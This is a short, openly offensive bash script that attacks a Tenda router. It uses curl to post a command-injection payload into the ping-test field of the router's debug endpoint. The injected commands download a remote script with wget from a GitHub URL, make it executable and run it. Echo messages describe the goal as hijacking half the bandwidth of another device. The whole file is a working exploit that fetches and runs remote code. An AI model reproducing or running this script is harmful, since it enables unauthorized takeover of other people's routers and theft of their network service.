#!/bin/bash
echo "[💀] DEPLOYING 50% BANDWIDTH HIJACK TO TENDA..."
ROUTER_IP="192.168.2.1"
PAYLOAD="';cd /etc; wget -q https://raw.githubusercontent.com/YOUR_USER/tenda-hijack/main/ROUTER_SCRIPTS/tenda_hijack.sh; chmod +x tenda_hijack.sh; ./tenda_hijack.sh &'"

curl -s -X POST "http://$ROUTER_IP/goform/setDebugCfg" \
    -d "module=ping_test&pingAddr=$PAYLOAD"
    
echo "[🔥] 50% BANDWIDTH HIJACK DEPLOYED!"
echo "[⚡] Tenda now stealing 50% from F670L!"